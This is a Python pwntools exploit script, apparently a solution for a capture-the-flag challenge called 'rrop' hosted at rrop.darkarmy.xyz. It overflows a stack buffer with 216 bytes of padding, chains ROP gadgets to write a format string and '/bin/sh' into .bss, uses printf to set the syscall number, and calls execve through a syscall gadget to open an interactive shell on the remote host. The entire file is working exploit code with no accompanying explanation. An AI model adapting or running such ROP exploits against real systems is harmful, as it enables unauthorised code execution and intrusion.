#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./rrop')

host = args.HOST or 'rrop.darkarmy.xyz'
port = int(args.PORT or 7001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *main
b *0x0000000000400843
b *0x00000000004008b1
continue
'''.format(**locals())

# -- Exploit goes here --

io = remote('rrop.darkarmy.xyz', '7001')

pop_rdi = 0x00000000004008b3
ret = 0x00000000004005b6

bss_addr = 0x6011a0
syscall_ret = 0x00000000004007d2
pop_rsi_r15 = 0x00000000004008b1
padding = 'a' * 216

write_bin_sh = flat([

	padding,
	ret,
	pop_rdi,
	0x0,
	pop_rsi_r15,
	bss_addr,
	0xdeadbeef,
	exe.sym['read'],
	exe.sym['main']

])

io.recvline()
io.recvline()

io.sendline(write_bin_sh)
io.sendline("%000059c\x00\x00\x00\x00\x00\x00\x00\x00/bin/sh\x00")

io.recvline()
io.recvline()

printf_fmt = bss_addr
null_char = bss_addr + 8
bin_sh = bss_addr + 16

set_rax = flat([

	padding,
	pop_rdi,
	printf_fmt,
	pop_rsi_r15,
	null_char,
	0xdeadbeef,
	exe.sym['printf'],
	ret

])

setup_execve = flat([

	pop_rdi,
	bin_sh,
	pop_rsi_r15,
	0x0,
	0x0,
	syscall_ret

])

exploit = set_rax + setup_execve

io.send(exploit)
io.recv()
io.interactive()